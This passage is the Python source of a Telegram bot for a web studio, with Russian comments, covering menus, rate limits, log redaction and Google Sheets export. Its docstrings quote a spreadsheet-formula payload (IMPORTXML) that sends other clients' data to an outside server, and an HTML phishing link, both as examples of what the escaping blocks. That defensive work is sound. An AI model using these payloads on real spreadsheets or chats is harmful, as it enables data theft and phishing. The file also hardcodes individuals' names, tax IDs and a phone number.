"""
ONYX WEB - Telegram-бот (Vercel, webhook).
Меню, строгая анкета с навигацией, корзина, оплата (физ/юр), формы, выгрузка в Google Sheets.
Только стандартная библиотека Python.
"""
import json, os, time, re, urllib.parse, urllib.request, hmac, hashlib, copy, base64
import secrets, socket, ipaddress
from http.server import BaseHTTPRequestHandler

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
MANAGER_CHAT_ID = os.environ.get("MANAGER_CHAT_ID", "")
SITE_URL = os.environ.get("SITE_URL", "https://onyx-web.ru/")
# Контакты - как в футере onyx-web.ru
# Менеджер, который отвечает клиентам. Имя показываем рядом с ником:
# «ваш менеджер Иван» звучит как человек, а голый ник - как служба поддержки.
MANAGER_USERNAME = os.environ.get("MANAGER_USERNAME", "NOVlK0V")
MANAGER_NAME = os.environ.get("MANAGER_NAME", "Иван")


def manager_link(text=None):
    """Кликабельная ссылка на менеджера для HTML-сообщений."""
    return f'<a href="https://t.me/{MANAGER_USERNAME}">{text or ("@" + MANAGER_USERNAME)}</a>'


def manager_md(text=None):
    """То же самое для markdown-экранов (send_rich)."""
    return f'[{text or ("@" + MANAGER_USERNAME)}](https://t.me/{MANAGER_USERNAME})'
DEVELOPER_USERNAME = os.environ.get("DEVELOPER_USERNAME", "onyxcoop")
ONYX_EMAIL = os.environ.get("ONYX_EMAIL", "onyxwebcooperation@gmail.com")
ONYX_PHONE = os.environ.get("ONYX_PHONE", "+7 (908) 242-02-04")
# Реквизиты для официального чека («Мой налог», 422-ФЗ) - два самозанятых партнёра ONYX
ONYX_LEGAL = ("Самозанятый: Новиков Иван Максимович · ИНН 590586577935\n"
              "Партнёр (самозанятый): Бутаев Давид Александрович · ИНН 540538092505")
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "")
# Онлайн-оплата (Prodamus/ЮKassa и т.п.) ОТКЛЮЧЕНА. Оплата у клиентов - только по счёту.
PUBLIC_BASE_URL = os.environ.get("PUBLIC_BASE_URL", "").rstrip("/")  # напр. https://onyx-bot-4xn3.vercel.app
CHECKLIST_PDF_URL = os.environ.get("CHECKLIST_PDF_URL", "")
def clean_base_url(raw):
    """Привести значение переменной окружения к нормальному адресу.

    В поле значения на Vercel регулярно попадает лишнее: строка целиком
    вместе с именем переменной («TARIFF_IMG_BASE = https://…»), кавычки,
    пробелы, префикс `export`. Раньше такая опечатка молча ломала все
    картинки: значение не начиналось с http, бот приклеивал https:// спереди
    и получал заведомо битый адрес.

    Возвращает пустую строку, если после чистки ничего похожего на адрес
    не осталось - тогда сработает следующий кандидат в списке."""
    v = (raw or "").strip()
    if not v:
        return ""
    v = v.lstrip("﻿").strip()
    if v.lower().startswith("export "):
        v = v[7:].strip()
    # «ИМЯ = значение» или «ИМЯ=значение» - берём то, что справа
    if "=" in v:
        left, right = v.split("=", 1)
        if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*\s*", left):
            v = right.strip()
    v = v.strip("'\"` \t").rstrip("/")
    if not v:
        return ""
    if not v.startswith(("http://", "https://")):
        # Голый домен - это нормально, Vercel так и отдаёт VERCEL_URL.
        # А вот пробел внутри означает, что это не адрес, а мусор.
        if " " in v or "/" in v.split(".")[0]:
            return ""
        v = "https://" + v
    # Финальная проверка: домен должен быть похож на домен
    host = urllib.parse.urlparse(v).netloc
    if not host or " " in host or "." not in host:
        return ""
    return v


def public_base():
    """Адрес, по которому лежит статика бота (public/): карточки тарифов, чек-лист.

    Порядок: свои переменные → домены, которые Vercel подставляет сам → запасной.
    Благодаря двум средним пунктам ничего настраивать руками не нужно -
    раньше забытая переменная молча ломала и картинки, и чек-лист.

    Каждое значение проходит чистку: опечатка в одной переменной не должна
    ронять статику, если следующая по списку задана правильно."""
    for v in (os.environ.get("TARIFF_IMG_BASE"), os.environ.get("PUBLIC_BASE_URL"),
              os.environ.get("VERCEL_PROJECT_PRODUCTION_URL"), os.environ.get("VERCEL_URL")):
        cleaned = clean_base_url(v)
        if cleaned:
            return cleaned
    return "https://onyx-bot-4xn3.vercel.app"


_CHECKLIST_BASE = public_base()
# Чек-лист лежит рядом с ботом (public/checklist.html) - не зависит от сайта и не даёт 404.
# Переменной CHECKLIST_URL можно переопределить, если страницу перенесут.
CHECKLIST_URL = (os.environ.get("CHECKLIST_URL", "")
                 or (_CHECKLIST_BASE + "/checklist.html" if _CHECKLIST_BASE else ""))
# База для картинок тарифов. По умолчанию - домен самого бота (public/tariffs/*.png).
TARIFF_IMG_BASE = os.environ.get("TARIFF_IMG_BASE", "").rstrip("/")
# Карточки тарифов: по умолчанию статичные. TARIFF_ANIMATED=1 включит
# анимированные версии (нужны файлы public/tariffs/*.mp4).
TARIFF_ANIMATED = os.environ.get("TARIFF_ANIMATED", "0") not in ("0", "false", "no")
SHEETS_WEBHOOK_URL = os.environ.get("SHEETS_WEBHOOK_URL", "")
# Общий секрет со скриптом Google. Адрес /exec публичен по своей природе:
# доступ «Кто угодно» обязателен, иначе бот не сможет писать. Секрет в теле
# запроса отсекает записи от того, кто просто узнал адрес.
SHEETS_SECRET = os.environ.get("SHEETS_SECRET", "").strip()


def check_env():
    """Проверить окружение при старте и громко сказать, чего не хватает.

    Часть настроек тихо отключают защиту: без WEBHOOK_SECRET нельзя подтвердить
    источник апдейта, без CRON_SECRET открыт запуск рассылок. Раньше об этом
    никто не узнавал, потому что код просто пропускал проверку."""
    missing, weak = [], []
    if not os.environ.get("BOT_TOKEN"):
        missing.append("BOT_TOKEN - бот не сможет отвечать")
    if not os.environ.get("ADMIN_IDS") and not os.environ.get("ADMIN_TELEGRAM_IDS"):
        missing.append("ADMIN_TELEGRAM_IDS - некому получать уведомления")
    if not os.environ.get("WEBHOOK_SECRET"):
        weak.append("WEBHOOK_SECRET - источник апдейтов не подтверждается, "
                    "админ-функции отключены")
    if not os.environ.get("CRON_SECRET"):
        weak.append("CRON_SECRET - плановые задачи отключены")
    if not os.environ.get("SHEETS_SECRET") and os.environ.get("SHEETS_WEBHOOK_URL"):
        weak.append("SHEETS_SECRET - записи в таблицу принимаются без общего секрета")
    for m in missing:
        print("ENV ОБЯЗАТЕЛЬНО:", m)
    for w in weak:
        print("ENV БЕЗОПАСНОСТЬ:", w)
    return missing, weak


def _parse_admin_ids():
    raw = (os.environ.get("ADMIN_IDS", "") + "," + os.environ.get("ADMIN_TELEGRAM_IDS", ""))
    return {int(x) for x in raw.replace(" ", "").split(",") if x.isdigit()}


ADMIN_IDS = _parse_admin_ids()

# Секрет планировщика. Vercel сам подставляет его в заголовок Authorization
# для задач из vercel.json, если переменная задана в настройках проекта.
CRON_SECRET = os.environ.get("CRON_SECRET", "").strip()

# Предел размера тела запроса. Апдейт Telegram - это десятки килобайт.
MAX_BODY_BYTES = 512 * 1024

# Подтверждён ли источник текущего запроса секретным заголовком Telegram.
# Список, а не переменная, чтобы значение менялось изнутри обработчика.
# Значение по умолчанию - True: вне HTTP (крон, самопроверка) подделывать нечего.
_REQUEST_TRUSTED = [True]


# ---------------------------------------------------------------------------
#  Ограничение частоты
#
#  Один человек не должен уметь загрузить систему: каждый аудит - это внешний
#  запрос и запись в таблицу, каждое сообщение - вызовы Telegram и базы.
#  Считаем действия в скользящем окне и мягко просим подождать.
#
#  Отдельно ограничиваем аудит: он самый дорогой и самый привлекательный
#  для злоупотребления.
# ---------------------------------------------------------------------------

RATE_LIMITS = {
    # ключ: (сколько действий, за сколько секунд, что ответить)
    "msg":   (25, 60, "Слишком много сообщений подряд. Подождите минуту, пожалуйста."),
    "cb":    (40, 60, ""),                     # нажатия кнопок - молча притормаживаем
    "audit": (5, 3600, "Больше пяти проверок в час не делаем - "
                       "иначе очередь встаёт для всех. Возвращайтесь через час."),
}


def rate_ok(uid, bucket="msg"):
    """False - лимит исчерпан. Администраторов не ограничиваем."""
    if not uid or is_admin(uid):
        return True
    limit, window, _ = RATE_LIMITS.get(bucket, RATE_LIMITS["msg"])
    key = f"onyx:rl:{bucket}:{uid}"
    now = int(time.time())
    hits = [t for t in (_get(key) or []) if now - t < window]
    if len(hits) >= limit:
        return False
    hits.append(now)
    # immediate=True: параллельный запрос должен сразу видеть счётчик,
    # иначе поток сообщений проскочит мимо лимита.
    _set(key, hits[-limit:], ttl=window, immediate=True)
    return True


def rate_notice(chat_id, uid, bucket="msg"):
    """Сообщить о лимите, но не чаще раза в минуту - иначе получится флуд
    в ответ на флуд."""
    msg = RATE_LIMITS.get(bucket, ("", 0, ""))[2]
    if not msg:
        return
    key = f"onyx:rlnote:{uid}"
    if _get(key):
        return
    _set(key, 1, ttl=60, immediate=True)
    try:
        send(chat_id, "⏳ " + msg)
    except Exception:
        pass


# ---------------------------------------------------------------------------
#  Синяя кнопка «Меню» слева от поля ввода
#
#  Telegram показывает её сам, если у бота заданы команды. Списки разные:
#  клиенту - только «Старт», чтобы не пугать его служебными командами;
#  администратору - всё, с человеческими описаниями, чтобы не держать в голове.
#
#  Список для админа привязывается к конкретному чату (scope=chat), поэтому
#  никто, кроме него, этих команд в меню не увидит.
# ---------------------------------------------------------------------------

CLIENT_COMMANDS = [
    ("start", "Начать заново - главное меню"),
]

ADMIN_COMMANDS = [
    # Ежедневное
    ("start",            "Главное меню бота"),
    ("admin",            "Панель управления: заявки, клиенты, задачи"),
    ("orders",           "Список заказов и их статусы"),
    ("crm",              "Кто на каком этапе воронки"),
    ("funnel",           "Аналитика: сколько людей дошло до каждого шага"),
    ("invoices",         "Запросы счёта от юрлиц"),
    ("partners",         "Заявки от партнёров"),
    ("factory",          "Конвейер производства сайтов"),

    # Работа с клиентом
    ("reply",            "Ответить на обращение: /reply id текст"),
    ("changes",          "Записать правки клиента: /changes id текст"),
    ("consdone",         "Отметить, что консультация проведена"),
    ("set_order_status", "Сменить статус заказа: /set_order_status id статус"),
    ("fstatus",          "Статус производства: /fstatus id статус"),
    ("partner_status",   "Статус заявки партнёра"),
    ("drive",            "Папка клиента на Google Диске"),
    ("auditlink",        "Ссылка на аудит клиента"),

    # Тексты и рассылки
    ("post",             "Собрать рассылку по теме"),
    ("broadcast",        "Разослать текст всем: /broadcast текст"),
    ("broadcasts",       "История рассылок"),
    ("prompts",          "Промпты для генерации сайта: /prompts id"),
    ("prompt",           "Один промпт по номеру: /prompt1 … /prompt6"),

    # Настройка и диагностика
    ("voiceid",          "Записать голосовое - вернёт его file_id"),
    ("export",           "Выгрузить данные"),
    ("sheettest",        "Проверить, принимает ли таблица записи"),
    ("drivetest",        "Проверить доступ к Google Диску"),
    ("speed",            "Замерить скорость всех интеграций"),
    ("richtest",         "Проверить оформление сообщений"),
    ("audittest",        "Разбор аудита по шагам: /audittest сайт.ру"),
    ("menurefresh",      "Обновить это меню команд"),
    ("id",               "Показать мой chat_id"),
    ("admin_help",       "Подсказка по всем админ-командам"),
]


def setup_bot_commands(force=False):
    """Прописать команды в Telegram: клиентам короткий список, админам полный.

    Вызывается раз в сутки при холодном старте - чаще незачем, список меняется
    редко, а лишние обращения к API замедляют ответ клиенту. Принудительно -
    командой /menurefresh."""
    if not force and _get("onyx:menu_set"):
        return False
    try:
        # 1. Всем по умолчанию - только «Старт»
        tg("setMyCommands",
           commands=[{"command": c, "description": d} for c, d in CLIENT_COMMANDS],
           scope={"type": "default"})

        # 2. Каждому администратору - свой полный список в его личном чате
        for aid in ADMIN_IDS:
            tg("setMyCommands",
               commands=[{"command": c, "description": d} for c, d in ADMIN_COMMANDS[:100]],
               scope={"type": "chat", "chat_id": aid})

        # 3. Сама кнопка: тип «commands» - та самая синяя слева от поля ввода
        tg("setChatMenuButton", menu_button={"type": "commands"})

        _set("onyx:menu_set", int(time.time()), ttl=86400, immediate=True)
        return True
    except Exception as e:
        log_error("menu", f"не удалось прописать команды: {e}", notify=False)
        return False


# ---------------------------------------------------------------------------
#  История экранов: настоящая кнопка «Назад»
#
#  Раньше почти отовсюду вёл только выход в главное меню. Для человека это
#  потеря: он нажал не туда, а его выбросило в самое начало, и пройденные
#  шаги надо повторять. Особенно больно в середине воронки.
#
#  Держим небольшой стек последних экранов на пользователя. Кнопка «Назад»
#  достаёт предыдущий и открывает его заново - тем же обработчиком, что и
#  при обычном нажатии, поэтому новые экраны поддерживаются автоматически.
# ---------------------------------------------------------------------------

NAV_STACK_MAX = 8

# Экраны, которые в историю не кладём: служебные, одноразовые и те,
# возврат на которые ничего не даст или запустит действие повторно.
NAV_SKIP_PREFIXES = (
    "b:back", "b:home", "adm:", "task:", "prod:", "rev:adm", "cons:when",
    "qual:", "brief:push", "up:done", "mat:ok", "audit:again",
)


def nav_push(uid, data):
    """Запомнить экран, на котором человек сейчас находится."""
    if not uid or not data or data.startswith(NAV_SKIP_PREFIXES):
        return
    st = _get(f"onyx:nav:{uid}") or []
    if st and st[-1] == data:
        return                      # то же самое нажали дважды
    st.append(data)
    _set(f"onyx:nav:{uid}", st[-NAV_STACK_MAX:], ttl=86400)


def nav_back_target(uid):
    """Куда вести кнопку «Назад». None - истории нет, ведём в меню."""
    st = _get(f"onyx:nav:{uid}") or []
    return st[-2] if len(st) >= 2 else None


def nav_pop(uid):
    """Снять текущий экран и вернуть предыдущий."""
    st = _get(f"onyx:nav:{uid}") or []
    if len(st) < 2:
        _set(f"onyx:nav:{uid}", [], ttl=86400)
        return None
    st.pop()
    prev = st[-1]
    _set(f"onyx:nav:{uid}", st, ttl=86400)
    return prev


def nav_clear(uid):
    _set(f"onyx:nav:{uid}", [], ttl=86400)


def nav_row(uid=None, back=None, back_text="⬅️ Назад", home_text="🏠 В меню"):
    """Нижний ряд навигации: шаг назад плюс выход в меню.

    back - явный экран, если он известен. Иначе берём из истории.
    Если истории нет, показываем только меню: кнопка «Назад» в никуда
    раздражает сильнее, чем её отсутствие."""
    target = back or (nav_back_target(uid) if uid else None)
    row = []
    if target:
        row.append({"text": back_text, "callback_data": target if back else "b:back"})
    row.append({"text": home_text, "callback_data": "b:home"})
    return row


def _warn_webhook_unverified():
    """Секрет вебхука не задан - предупреждаем администратора, но не чаще
    раза в час, чтобы не залить чат при потоке сообщений."""
    try:
        if _get("onyx:websecret:warned"):
            return
        _set("onyx:websecret:warned", 1, ttl=3600, immediate=True)
        notify_admins(
            "🔴 <b>Не задан WEBHOOK_SECRET</b>\n"
            "Источник апдейтов нельзя подтвердить, поэтому админ-функции "
            "временно отключены: кто угодно мог бы прислать запрос от вашего имени.\n\n"
            "Что сделать: задать <code>WEBHOOK_SECRET</code> в переменных Vercel "
            "и заново зарегистрировать вебхук с параметром <code>secret_token</code>.")
    except Exception:
        pass


def is_admin(uid):
    """Админ - только если и ID в списке, и источник запроса подтверждён.

    Второе условие важнее первого: ID берётся из тела апдейта, а тело
    контролирует отправитель. Без подтверждённого секрета любой человек
    мог бы назваться администратором."""
    if not _REQUEST_TRUSTED[0]:
        return False
    return uid in ADMIN_IDS

KV_URL = os.environ.get("KV_REST_API_URL") or os.environ.get("UPSTASH_REDIS_REST_URL") or ""
KV_TOKEN = os.environ.get("KV_REST_API_TOKEN") or os.environ.get("UPSTASH_REDIS_REST_TOKEN") or ""
_MEM = {}


# ------------------------- Telegram -------------------------
def tg(method, **params):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    data = json.dumps(params).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.load(r)
    except Exception as e:
        print("TG error:", method, e)
        return None


# Предел Telegram на одно сообщение - 4096 символов. Более длинное просто
# отклоняется с ошибкой 400, и клиент не получает ничего. Обрезаем сами,
# с запасом на закрывающие теги.
TG_TEXT_LIMIT = 4000


def clip_message(text):
    """Обрезать слишком длинный текст по границе абзаца, а не посреди слова.

    Резать нужно аккуратно: если разорвать HTML-тег, Telegram отклонит
    сообщение целиком - то есть лечение окажется хуже болезни."""
    t = text or ""
    if len(t) <= TG_TEXT_LIMIT:
        return t
    cut = t[:TG_TEXT_LIMIT]
    for sep in ("\n\n", "\n", ". "):
        i = cut.rfind(sep)
        if i > TG_TEXT_LIMIT * 0.6:
            cut = cut[:i]
            break
    # Незакрытые теги ломают разметку - убираем хвост от последнего «<»
    if cut.rfind("<") > cut.rfind(">"):
        cut = cut[:cut.rfind("<")]
    log_error("length", f"сообщение обрезано: было {len(t)} символов", notify=False)
    return cut.rstrip() + "\n\n<i>…показали главное. Остальное разберём на консультации.</i>"


def send(chat_id, text, reply_markup=None):
    p = {"chat_id": chat_id, "text": clip_message(text), "parse_mode": "HTML",
         "disable_web_page_preview": True}
    if reply_markup is not None:
        p["reply_markup"] = reply_markup
    return tg("sendMessage", **p)


# ============================================================================
#  RICH MESSAGES (Bot API 10.1 от 11.06.2026 / 10.2 от 14.07.2026)
#  Заголовки, таблицы, списки, разделители, сворачиваемые блоки, до 32 768 символов.
#  Метод sendRichMessage принимает объект InputRichMessage. Точную форму объекта
#  подбираем на первом вызове и запоминаем - так бот не сломается, если Telegram
#  назовёт поля иначе, чем мы ожидаем. Не получилось - молча уходим в обычный HTML.
# ============================================================================
RICH_ENABLED = os.environ.get("RICH_TEXT", "1") not in ("0", "false", "no")

# Варианты полезной нагрузки, от самого вероятного к запасным.
RICH_SHAPES = [
    ("markdown", lambda t: {"markdown": t}),
    ("html", lambda t: {"html": t}),
    ("text+md", lambda t: {"text": t, "parse_mode": "RichMarkdown"}),
    ("text+html", lambda t: {"text": t, "parse_mode": "RichHTML"}),
]


def _rich_shape():
    return _get("onyx:rich_shape")


def _rich_shape_set(name):
    _set("onyx:rich_shape", name, ttl=YEAR)


def rich_supported():
    """False - если пробовали и ничего не сработало (не долбим API на каждом сообщении)."""
    return RICH_ENABLED and _rich_shape() != "none"


def _rich_call(method, base, md):
    """Вызвать sendRichMessage/editMessageText с подбором формы объекта."""
    known = _rich_shape()
    shapes = ([s for s in RICH_SHAPES if s[0] == known] or RICH_SHAPES) if known else RICH_SHAPES
    for name, build in shapes:
        r = tg(method, **dict(base, rich_message=build(md)))
        if r and r.get("ok"):
            if known != name:
                _rich_shape_set(name)
            return r
    if not known:
        _rich_shape_set("none")   # ни один вариант не принят - больше не пробуем
        log_error("rich", "sendRichMessage не принят ни в одном формате - работаем на HTML", notify=False)
    return None


def _esc(s):
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


# Предел длины одного сообщения от пользователя. Анкетные ответы длиннее
# полутора тысяч символов - это либо ошибка, либо попытка раздуть запись.
MAX_USER_TEXT = 1500


def clean_user_text(raw):
    """Привести входящий текст к безопасному виду один раз, на входе.

    Бот отправляет все сообщения с parse_mode=HTML, а ответы клиента
    подставляются в них подстановкой - в том числе в уведомления
    администратору. Без обработки клиент может:

      • прислать `<a href="https://phish.example">Подтвердить оплату</a>` -
        оператор увидит в своём чате рабочую ссылку от имени бота;
      • прислать одиночный `<b` - Telegram ответит ошибкой 400, и уведомление
        о заявке не придёт вообще, то есть заявка потеряется молча.

    Экранируем угловые скобки и амперсанд: в чате символы отображаются как
    введены, но разметкой уже не становятся. Заодно убираем управляющие
    символы и ограничиваем длину."""
    s = (raw or "")
    if not isinstance(s, str):
        s = str(s)
    # Управляющие символы (кроме перевода строки и табуляции) в тексте не нужны
    s = "".join(ch for ch in s if ch in "\n\t" or ord(ch) >= 32)
    s = s.strip()
    if len(s) > MAX_USER_TEXT:
        s = s[:MAX_USER_TEXT] + "…"
    return _esc(s)


def _inline_md(s):
    """Инлайн-разметка markdown → HTML. Экранируем ДО вставки тегов."""
    s = _esc(s)
    s = re.sub(r"\[([^\]]+)\]\((https?://[^\s)]+)\)", r'<a href="\2">\1</a>', s)
    s = re.sub(r"\*\*(.+?)\*\*", r"<b>\1</b>", s)
    s = re.sub(r"(?<!\*)\*([^*\n]+?)\*(?!\*)", r"<i>\1</i>", s)
    s = re.sub(r"__(.+?)__", r"<u>\1</u>", s)
    s = re.sub(r"~~(.+?)~~", r"<s>\1</s>", s)
    s = re.sub(r"`([^`]+?)`", r"<code>\1</code>", s)
    return s


def _md_table(rows):
    """Таблица → моноширинный блок с выравниванием колонок (переживает любой клиент)."""
    cells = [[c.strip() for c in r.strip().strip("|").split("|")] for r in rows]
    cells = [c for c in cells if not all(re.fullmatch(r":?-{2,}:?", x or "-") for x in c)]
    if not cells:
        return ""
    n = max(len(r) for r in cells)
    cells = [r + [""] * (n - len(r)) for r in cells]
    plain = [[re.sub(r"[*`_~]", "", c) for c in r] for r in cells]
    w = [max(len(r[i]) for r in plain) for i in range(n)]
    out = []
    for r in plain:
        out.append("  ".join(r[i].ljust(w[i]) if i < n - 1 else r[i] for i in range(n)).rstrip())
    return "<pre>" + _esc("\n".join(out)) + "</pre>"


def md_to_html(md):
    """Rich Markdown → обычный HTML Telegram. Нужен как запасной вариант:
    текст пишем один раз в markdown, а откат собирается сам."""
    lines, out, table = md.split("\n"), [], []
    for ln in lines:
        s = ln.rstrip()
        if s.lstrip().startswith("|") and s.count("|") >= 2:
            table.append(s); continue
        if table:
            out.append(_md_table(table)); table = []
        st = s.strip()
        if re.fullmatch(r"-{3,}|_{3,}|\*{3,}", st):
            out.append("➖➖➖➖➖➖➖➖➖➖➖➖"); continue
        m = re.match(r"^(#{1,6})\s+(.*)$", st)
        if m:
            lvl, txt = len(m.group(1)), _inline_md(m.group(2))
            out.append(("\n" if out else "") + (f"<b>{txt.upper()}</b>" if lvl <= 2 else f"<b>{txt}</b>"))
            continue
        m = re.match(r"^>\s?(.*)$", st)
        if m:
            out.append(f"<blockquote>{_inline_md(m.group(1))}</blockquote>"); continue
        m = re.match(r"^[-*+]\s+\[( |x|X)\]\s+(.*)$", st)
        if m:
            out.append(("✅ " if m.group(1).lower() == "x" else "⬜️ ") + _inline_md(m.group(2))); continue
        m = re.match(r"^[-*+]\s+(.*)$", st)
        if m:
            out.append("• " + _inline_md(m.group(1))); continue
        m = re.match(r"^(\d+)[.)]\s+(.*)$", st)
        if m:
            out.append(f"{m.group(1)}. " + _inline_md(m.group(2))); continue
        out.append(_inline_md(s))
    if table:
        out.append(_md_table(table))
    return re.sub(r"\n{3,}", "\n\n", "\n".join(out)).strip()


def send_rich(chat_id, md, html_fallback=None, reply_markup=None):
    """Отправить структурированное сообщение. Пишем ОДИН текст в markdown -
    HTML-версия для отката собирается автоматически."""
    if rich_supported():
        base = {"chat_id": chat_id}
        if reply_markup is not None:
            base["reply_markup"] = reply_markup
        r = _rich_call("sendRichMessage", base, md)
        if r:
            return r
    return send(chat_id, html_fallback or md_to_html(md), reply_markup)


def edit_rich(chat_id, mid, md, html_fallback=None, reply_markup=None):
    """То же для редактирования - воронка живёт в одном сообщении."""
    if mid and rich_supported():
        base = {"chat_id": chat_id, "message_id": mid}
        if reply_markup is not None:
            base["reply_markup"] = reply_markup
        r = _rich_call("editMessageText", base, md)
        if r:
            return r
    return edit_or_send(chat_id, mid, html_fallback or md_to_html(md), reply_markup)


def answer_cb(cq_id, text=None):
    p = {"callback_query_id": cq_id}
    if text:
        p["text"] = text
    tg("answerCallbackQuery", **p)


def redact(text):
    """Убрать из строки то, что не должно попадать в логи и в чат.

    В лог уходит текст исключения, а исключение могло произойти на строке
    с телефоном клиента или с адресом, в котором зашит токен. Логи Vercel
    хранятся дольше, чем нужно, и доступны всем, у кого есть доступ к проекту.

    Заменяем: токен бота, ключи, длинные адреса Google Script, телефоны, ИНН,
    электронную почту. Оставляем достаточно, чтобы понять, что произошло."""
    s = str(text)
    if BOT_TOKEN:
        s = s.replace(BOT_TOKEN, "‹токен›")
    for val in (KV_TOKEN, SHEETS_SECRET, WEBHOOK_SECRET, CRON_SECRET,
                os.environ.get("AI_API_KEY", "")):
        if val and len(val) > 6:
            s = s.replace(val, "‹секрет›")
    s = re.sub(r"\d{8,10}:[A-Za-z0-9_-]{30,}", "‹токен›", s)
    s = re.sub(r"(script\.google\.com/macros/s/)[A-Za-z0-9_-]{10,}", r"\1‹id›", s)
    s = re.sub(r"\+?\d[\d\s()-]{9,}\d", "‹телефон›", s)
    s = re.sub(r"\b\d{10}\b|\b\d{12}\b", "‹инн›", s)
    s = re.sub(r"[\w.+-]+@[\w-]+\.[\w.]+", "‹почта›", s)
    return s


def log_error(kind, detail="", notify=False):
    """Записать ошибку в кольцевой лог (для админ-раздела «Ошибки») и опц. уведомить админов."""
    try:
        line = f"{time.strftime('%d.%m %H:%M')} · {kind}: {redact(detail)[:180]}"
        print("ERR:", line)
        errs = _get("onyx:errors_recent") or []
        errs.append(line)
        _set("onyx:errors_recent", errs[-40:], ttl=YEAR)
        if notify:
            try:
                notify_admins(f"🐞 <b>Ошибка системы</b>\n{line}")
            except Exception:
                pass
    except Exception as e:
        print("log_error failed", e)


def safe_send(chat_id, text, reply_markup=None):
    """Отправка с обработкой ошибок (заблокировал бота / удалил чат). Возвращает True/False."""
    r = send(chat_id, text, reply_markup)
    if r and r.get("ok"):
        return True
    desc = (r or {}).get("description", "") if isinstance(r, dict) else ""
    if any(s in desc.lower() for s in ("blocked", "deactivated", "chat not found", "kicked")):
        try:
            p = user_get(chat_id) or {}
            if p:
                p["bot_blocked"] = True
                user_save(chat_id, p)
        except Exception:
            pass
    return False


def edit_or_send(chat_id, mid, text, kb=None):
    """Редактирует сообщение с кнопкой (inline-меню) вместо отправки нового.
    Используется только там, где не нужна reply-клавиатура (ReplyKeyboardMarkup) -
    её нельзя навесить через editMessageText, только через новый send()."""
    if mid:
        r = tg("editMessageText", chat_id=chat_id, message_id=mid, text=text,
               parse_mode="HTML", reply_markup=kb)
        if r and r.get("ok"):
            return r
    return send(chat_id, text, kb)


# Предохранитель Sheets: после ошибки не долбимся в таблицу 30 сек, чтобы не вешать бота
# на таймауте при каждом действии. Данные всё равно лежат в KV.
_SHEET_BREAKER = [0.0]
_SHEET_COOLDOWN = 30
# Последняя причина отказа таблицы и когда админам об этом сообщили.
# Без этого таблица могла молча не писаться неделями: ошибка уходила в лог, но никто её не видел.
_SHEET_LAST_ERR = [""]
_SHEET_NOTIFIED = [0.0]
_SHEET_NOTIFY_EVERY = 3600


def _sheet_failed(reason):
    """Зафиксировать отказ таблицы и не чаще раза в час сказать об этом админам."""
    _SHEET_BREAKER[0] = time.time()
    _SHEET_LAST_ERR[0] = f"{time.strftime('%d.%m %H:%M')} · {str(reason)[:180]}"
    try:
        _set("onyx:sheet_last_err", _SHEET_LAST_ERR[0], ttl=YEAR, immediate=True)
    except Exception:
        pass
    loud = time.time() - _SHEET_NOTIFIED[0] > _SHEET_NOTIFY_EVERY
    if loud:
        _SHEET_NOTIFIED[0] = time.time()
    try:
        log_error("sheets", reason, notify=loud)
    except Exception:
        print("Sheet error:", reason)


_SHEET_Q = []          # очередь строк: пишем в таблицу после ответа клиенту
_SHEET_Q_MAX = 25      # предохранитель от разрастания в одном запросе


# Символы, с которых Google Sheets начинает считать содержимое ячейки формулой.
_FORMULA_STARTERS = ("=", "+", "-", "@", "\t", "\r")


def sheet_safe(value):
    """Обезвредить значение перед записью в таблицу.

    Google Sheets выполняет содержимое ячейки, если оно начинается с «=».
    Клиент, написавший в анкете `=IMPORTXML("https://чужой.сайт/?d="&A2,"//a")`,
    заставит таблицу владельца отправить соседние ячейки - телефоны и ИНН
    других клиентов - на сторонний сервер. Владелец при этом видит обычную
    ячейку и ничего не замечает.

    Ставим апостроф впереди: Sheets покажет текст как есть и не станет считать
    его формулой. Апостроф в самой таблице не отображается."""
    if isinstance(value, str):
        v = value.lstrip(" \t\r\n\u200b\ufeff")   # пробелы и невидимые символы в начале
        if v[:1] in _FORMULA_STARTERS:
            return "'" + v
        return v
    if isinstance(value, dict):
        return {k: sheet_safe(x) for k, x in value.items()}
    if isinstance(value, list):
        return [sheet_safe(x) for x in value]
    return value


def post_to_sheet(row):
    """Не пишем сразу - кладём в очередь. Реальная отправка в flush_sheets()
    в самом конце обработки апдейта, когда клиент уже получил сообщения."""
    if not SHEETS_WEBHOOK_URL:
        return
    if len(_SHEET_Q) < _SHEET_Q_MAX:
        _SHEET_Q.append(sheet_safe(row))


def flush_sheets():
    """Выгрузить очередь ОДНИМ запросом. Apps Script отвечает ~1 секунду,
    поэтому четыре записи по очереди - это четыре секунды жизни функции.
    Пакетом получается одна секунда независимо от числа строк."""
    if not _SHEET_Q:
        return
    rows, _SHEET_Q[:] = list(_SHEET_Q), []
    if len(rows) == 1:
        _post_to_sheet_now(rows[0])
        return
    if not _post_to_sheet_now({"batch": rows}):
        for r in rows:      # старый скрипт не понял пакет - шлём по одной
            _post_to_sheet_now(r)


def _post_to_sheet_now(row):
    """Возвращает True при успехе - по этому flush_sheets понимает,
    понял ли скрипт пакетную отправку."""
    if not SHEETS_WEBHOOK_URL:
        return False
    if time.time() - _SHEET_BREAKER[0] < _SHEET_COOLDOWN:
        return False  # недавно была ошибка - пропускаем запись, не блокируем пользователя
    try:
        # Общий секрет: адрес /exec публичный по своей природе, и если он утечёт,
        # посторонний сможет писать в таблицы. Секрет отсекает такие записи.
        if SHEETS_SECRET:
            row = dict(row, secret=SHEETS_SECRET)
        data = json.dumps(row, ensure_ascii=False).encode("utf-8")
        req = urllib.request.Request(SHEETS_WEBHOOK_URL, data=data,
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=8) as r:
            body = (r.read(200) or b"").decode("utf-8", "ignore").strip()
        if body[:2].lower() != "ok":
            _sheet_failed(f"таблица ответила не 'ok': {body[:120]}")
            return False
        return True
    except Exception as e:
        _sheet_failed(f"не отправилось в таблицу (пауза 30с): {e}")
        return False


def drive_call(payload, timeout=20):
    """Вызов Drive-режима Apps Script. Возвращает разобранный JSON или None.
    Отдельно от post_to_sheet: тут ждём ответ (нужна ссылка на папку) и таймаут больше -
    Apps Script скачивает файл из Telegram и кладёт на Диск."""
    if not SHEETS_WEBHOOK_URL:
        return None
    try:
        if SHEETS_SECRET:
